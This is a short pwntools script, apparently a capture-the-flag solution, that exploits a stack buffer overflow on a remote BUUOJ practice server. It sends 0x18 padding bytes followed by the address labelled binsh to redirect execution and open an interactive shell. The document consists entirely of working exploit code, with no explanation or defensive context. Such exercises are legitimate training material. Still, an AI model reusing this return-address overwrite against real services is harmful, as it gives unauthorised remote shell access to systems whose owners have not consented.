from pwn import *
sh = remote("node5.buuoj.cn",28379)
binsh = 0x4006E6
sh.recvuntil('[+]Please input the length of your name:')
sh.sendline(b"100")
#sh.recvuntil('[+]Please input the length of your name:')
payload = b"A"*0x18+p64(binsh)
a="[+]What's u name?"
sh.recvuntil("[+]What's u name?")
sh.sendline(payload)
sh.interactive()
